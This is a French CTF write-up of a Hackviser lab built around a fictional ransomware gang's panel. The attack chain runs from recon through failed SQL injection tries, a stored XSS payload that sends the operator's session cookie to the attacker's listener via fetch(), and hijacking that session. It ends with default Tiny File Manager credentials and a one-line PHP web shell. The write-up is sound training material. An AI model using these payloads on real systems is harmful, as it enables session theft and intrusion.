# CTF Writeup : Hexar Ransomware (Hackviser)

## 1. Contexte et Reconnaissance Initiale

Le défi commence par l'analyse d'une infrastructure utilisée par un gang de ransomware (Hexar). L'URL cible est `http://hexar1c2adk0mr1r.hv`.

* **Identifiant initial fourni** : `WIN-KH8L9J0K1L2M` (Device ID)
* **Reconnaissance (dirb/gobuster)** : Découverte des répertoires `/api/`, `/assets/`, `/javascript/`.
* **Technologies identifiées** : Apache 2.4.62 (Debian), PHP, jQuery 3.5.1.

En accédant à la page d'accueil (`index.php`), nous trouvons un formulaire demandant un `Device ID`. L'utilisation du Device ID `WIN-KH8L9J0K1L2M` nous permet de nous connecter au "Dashboard" de la victime.

## 2. Analyse du Dashboard et Pistes Explorées

Une fois connecté au dashboard persistant (grâce au cookie `PHPSESSID`), plusieurs éléments intéressants apparaissent :

1. **Informations Visibles** : Adresse Bitcoin du gang (`bc1qxy2kgdygjr3qtzq2n0yrf2493p83kkfjhx0wlh`), montant de la rançon ($2,800), IP et détails du système.
2. **Code Source JavaScript (`assets/js/main.js` & `assets/js/chat.js`)** :
    * **Fausse piste (`.database()`)** : Une fonction `.database()` non standard était utilisée dans `main.js`. Cela semblait suspect (possible Prototype Pollution), mais s'est avéré être soit une erreur de l'auteur du CTF, soit un détail ajouté pour nous ralentir.
    * **Protection XSS côté client** : Dans `chat.js`, le développeur avait explicitement écrit : `messageContent.textContent = msg.message; // Use textContent instead of innerHTML`. Cela empêchait le XSS de s'exécuter sur **notre** propre navigateur, mais laissait supposer qu'un panneau opérateur (qui lit nos messages) pourrait utiliser `innerHTML` et être vulnérable.
3. **API de Chat (`/api/chat.php`)** : Un système de chat interactif avec un "Operator" (un bot) qui répond de manière automatique. L'endpoint accepte les requêtes POST en JSON et un paramètre GET `victim_id`.

## 3. Tentatives d'Injection SQL (Échecs et Doutes)

Plusieurs tentatives d'injections SQL simples ont été menées sur les endpoints :

* `POST /index.php` avec `device_id=WIN-KH8L9J0K1L2M' OR 1=1-- -`
* `GET /api/chat.php?victim_id=6 OR 1=1`
* Injections basées sur le temps (Blind SQLi) avec `SLEEP(5)` sur `victim_id`.
* Plus tard, tests sur un endpoint admin `victim_details.php?id=1 AND 1=1`.

**Résultat** : Aucune injection SQL triviale n'a fonctionné. Les paramètres semblaient protégés ou castés en entiers (`intval`). La piste SQLi a donc été mise de côté au profit du XSS.

## 4. Exploitation du Stored XSS et Vol de Session (Session Hijacking)

L'idée principale était d'envoyer un payload XSS malveillant dans le chat. Si l'opérateur (le bot backend) visualise les messages sans assainissement (`sanitize`), son navigateur exécutera notre code JavaScript.

* **Étape 4.1 : Mise en place du listener (Serveur d'écoute local)**
    Lancement d'un serveur Python sur notre machine VPN (IP : `10.8.96.29`) :

    ```bash
    python3 -m http.server 8000
    ```

* **Étape 4.2 : Injection du Payload**
    Nous avons envoyé diverses requêtes contenant des payloads XSS à l'API de chat via `curl`.
    Exemple de payload réussi :

    ```bash
    curl -s -b cookies.txt -H "Content-Type: application/json" -d '{"message": "<img src=x onerror=fetch(\"http://10.8.96.29:8000/?c=\"+document.cookie)>"}' http://hexar1c2adk0mr1r.hv/api/chat.php
    ```

* **Étape 4.3 : Capture du Cookie**
    Le bot a "lu" notre message et déclenché l'exécution de `fetch()`. Dans les logs de notre serveur HTTP local, nous avons vu la requête entrante contenant le cookie de session de l'administrateur :

    ```
    172.20.6.26 - - [20/Feb/2026 19:26:32] "GET /?c=PHPSESSID=fb77bd556ea31a0a84319ea38ef74ff4 HTTP/1.1" 200 -
    ```

    Nouveau Cookie Opérateur : `PHPSESSID=fb77bd556ea31a0a84319ea38ef74ff4`

## 5. Découverte de l'Interface Administrateur Cachée

En utilisant le cookie de session volé, nous avons tenté d'accéder au tableau de bord (`dashboard.php`). Au lieu d'afficher la page de la victime, le serveur nous a considéré comme un "Operator".

En regardant le code source renvoyé, nous avons découvert que l'interface complète d'administration était cachée dans un répertoire avec un nom obfusqué :
👉 **`http://hexar1c2adk0mr1r.hv/d3a8f4966_admin/`**

La page comportait également un commentaire laissé par un développeur (Information Disclosure) :

```html
<!-- <a href="filemanager/" class="logout-btn" target="_blank">FILE MANAGER</a> -->
```

## 6. Exploitation du Gestionnaire de Fichiers (Default Credentials & RCE)

L'URL secrète `http://hexar1c2adk0mr1r.hv/d3a8f4966_admin/filemanager/` nous a conduits à une application tierce : **"Tiny File Manager"** (H3K, versions 2.4+).

Plutôt que de chercher des failles complexes dans ce gestionnaire, nous avons essayé les identifiants par défaut standard de ce script open source.

* **Identifiants Defaults testés et valides** : `admin` / `admin@123`

Une fois authentifiés sur ce gestionnaire, nous avons obtenu un accès total (Lecture/Écriture) aux fichiers du serveur web avec les permissions de l'utilisateur `www-data`.

* *(Note sur la RCE)* : À ce stade, nous avions la possibilité absolue de réaliser une Exécution de Code à Distance (RCE) persistante en uploadant simplement un fichier `shell.php` contenant `<?php system($_GET['cmd']); ?>`.

## 7. Extraction des Données et Résolution

Le gestionnaire de fichiers permettait de naviguer dans les dossiers du serveur. Dans le répertoire racine géré par l'application (`files/`), la liste complète des documents confidentiels du gang de ransomware était visible (sauvegardes SQL, factures, dossiers RH, etc.).

Nous avons repéré un sous-répertoire nommé `hexar` (le nom du gang).
En l'explorant, nous avons trouvé le fichier cible : **`targets.txt`**

Contenu partiel du fichier :

```text
michael.davis@hamiltonfinancial.hv
jessica.smith@hamiltonfinancial.hv
jessica.miller@hamiltonfinancial.hv
david.davis@hamiltonfinancial.hv
john.taylor@hamiltonfinancial.hv
...
```

**Réponse Finale** :
La première adresse email sur la liste cible du gang est : **`michael.davis@hamiltonfinancial.hv`**

---
*Ce writeup couvre le cheminement complet, confirmant que la chaîne d'attaque était : Reconnaissance -> Stored XSS -> Session Hijacking -> Découverte Directory -> Default Credentials sur application tierce -> Arbitrary File Read (et possible RCE).*
